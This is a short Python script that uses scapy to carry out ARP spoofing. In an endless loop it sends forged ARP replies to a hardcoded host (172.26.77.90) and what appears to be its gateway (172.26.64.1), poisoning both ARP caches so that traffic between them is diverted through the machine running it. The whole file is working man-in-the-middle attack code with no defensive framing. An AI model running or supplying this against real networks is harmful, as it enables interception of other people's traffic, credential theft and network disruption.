#!/usr/bin/env pyhton

import scapy.all as scapy
import time 

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast= broadcast/arp_request
    answered_list =scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    target_mac= get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_counts = 0
while True :
    spoof("172.26.77.90", "172.26.64.1")
    spoof("172.26.64.1", "172.26.77.90")
    sent_packets_counts = sent_packets_counts +2
    print("[+] packet sent : " + str(sent_packets_counts))
    time.sleep(2)

# get_mac("172.26.64.1")
